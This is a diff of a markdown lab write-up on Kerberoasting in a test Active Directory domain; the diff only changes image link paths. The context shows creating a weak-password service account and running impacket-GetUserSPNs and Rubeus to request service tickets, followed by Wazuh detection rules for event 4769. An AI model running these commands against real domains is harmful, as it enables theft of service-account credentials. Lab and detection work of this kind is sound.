@@ -12,7 +12,7 @@ Example:
 ```
 MSSQLSvc/svc_web.redteam.local:1433
 ```
-![[adsiedit.msc.png]]
+![Description](Screenshots/adsiedit.msc.png)
 
 CLI: Create the Service Account
 `New-ADUser -Name "web_svc" -SamAccountName "web_svc" -AccountPassword (ConvertTo-SecureString "Password123" -AsPlainText -Force) -PasswordNeverExpires $true -Enabled $true` 
@@ -22,15 +22,15 @@ Assign SPN
 
 Verify SPN
 `setspn -L web_svc`
-![[Powershell Create SPN.png]]
+![Description](Screenshots/Powershell%20Create%20SPN.png)
 
 
 **The Attack**
 From Linux.  `impacket-GetUserSPNs -dc-ip $IP redteam.local/$CONTROLLED_USER$:$PASSWORD$ -request`
-![[Kali-Linux GetUserSPNs.png]]
+![Description](Screenshots/Kali-Linux%20GetUserSPNs.png)
 
 From Windows. `.\Rubeus.exe kerberoast /nowrap`
-![[Powershell Rubeus kerberoast.png]]
+![Description](Screenshots/Powershell%20Rubeus%20kerberoast.png)
 
 **Detection**
 Modify local_rules.xml in wazuh  to detect kerberoast.
@@ -59,7 +59,7 @@ level 12 High Severity Alert
 T1558.003 MITRE ATT&CK technique ID for Kerberoasting
 ```
 
-Wazuh capturing eventID 4769 Kerberos Service Ticket Request from `evil.user@REDTEAM.LOCAL` for service account `web_svc` using RC4 encryption (0x17), Indicating a Kerberoasting attempt.![[Active Directory/Kerberoasting/Wazuh Detection.png]]
+Wazuh capturing eventID 4769 Kerberos Service Ticket Request from `evil.user@REDTEAM.LOCAL` for service account `web_svc` using RC4 encryption (0x17), Indicating a Kerberoasting attempt.![Description](Screenshots/Wazuh%20Detection.png)
 
 **Remediations**
 
